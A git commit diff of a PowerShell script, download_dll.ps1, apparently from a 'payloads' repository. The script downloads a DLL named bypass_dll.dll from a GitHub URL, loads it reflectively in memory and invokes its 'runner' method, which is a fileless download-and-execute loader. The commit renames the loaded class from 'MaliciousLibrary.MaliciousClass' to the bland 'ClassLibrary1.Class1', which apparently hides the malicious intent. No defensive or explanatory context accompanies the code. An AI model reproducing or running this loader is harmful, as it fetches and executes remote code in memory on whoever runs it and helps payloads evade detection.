cfb6462da893cde30b72e810ece6d26b53089881
far-light <50488233+far-light@users.noreply.github.com>
2021-12-24 00:43:26 +0300

    Update download_dll.ps1

--- download_dll.ps1
+++ download_dll.ps1
@@ -1,6 +1,6 @@
 $data = (New-Object System.Net.WebClient).DownloadData('https://github.com/far-light/payloads/raw/main/bypass_dll.dll')
 
 $assem = [System.Reflection.Assembly]::Load($data)
-$class = $assem.GetType("MaliciousLibrary.MaliciousClass")
+$class = $assem.GetType("ClassLibrary1.Class1")
 $method = $class.GetMethod("runner")
 $method.Invoke(0, $null)
